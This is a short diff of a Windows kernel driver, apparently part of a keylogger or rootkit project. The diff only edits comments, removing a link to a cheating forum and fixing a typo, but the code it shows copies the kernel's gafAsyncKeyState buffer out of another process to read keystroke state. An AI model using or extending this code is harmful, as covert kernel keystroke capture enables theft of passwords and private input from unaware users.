@@ -23,14 +23,14 @@ UINT8 keyStateMap[64] = { 0 };
 UINT8 keyRecentStateMap[32] = { 0 };
 
 /**
- * https://www.unknowncheats.me/forum/c-and-c-/327461-kernel-mode-key-input.html
+ * Read the contents of gafAsyncKeyStateAddr into keyStateMap. 
  */
 VOID
 BeUpdateKeyStateMap(const HANDLE& procId, const PVOID& gafAsyncKeyStateAddr)
 {
 	SIZE_T size = 0;
 	BeGlobals::pMmCopyVirtualMemory(
-		BeGetEprocessByPid(HandleToULong(procId)), // winlogon can access the session driver
+		BeGetEprocessByPid(HandleToULong(procId)),
 		gafAsyncKeyStateAddr,
 		PsGetCurrentProcess(), 
 		&keyStateMap,
@@ -41,7 +41,7 @@ BeUpdateKeyStateMap(const HANDLE& procId, const PVOID& gafAsyncKeyStateAddr)
 }
 
 /**
- * Get the address of gasAsyncKeyState
+ * Get the address of gafAsyncKeyState
  * 
  * @returns UINT64 address of gafAsyncKeyState
  */
